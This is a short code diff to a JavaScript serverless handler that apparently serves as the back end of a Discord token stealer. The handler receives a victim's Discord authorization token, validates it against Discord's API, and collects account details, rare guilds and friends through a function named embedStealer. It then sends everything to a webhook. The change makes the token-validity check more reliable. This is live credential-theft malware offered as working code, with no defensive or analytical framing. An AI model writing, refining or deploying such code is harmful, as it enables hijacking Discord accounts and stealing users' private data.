@@ -22,13 +22,14 @@ export default async function handler(req, res) {
     const { data } = query;
     const embed = await getEmbed();
     const resp = await fetch('https://discord.com/api/v9/users/@me', { headers: { authorization: data } });
+    const json = await resp.json()
 
-    console.log((await resp.json()));
+    console.log(json);
 
     const infos = DiscordToken(data).all, 
       guilds = DiscordToken(data).guilds.rares,
       friends = DiscordToken(data).friends.rares;
-    const embedBuilder = infos.token ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
+    const embedBuilder = json.id ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
 
     await webhook.send({
       embeds: [embedBuilder],
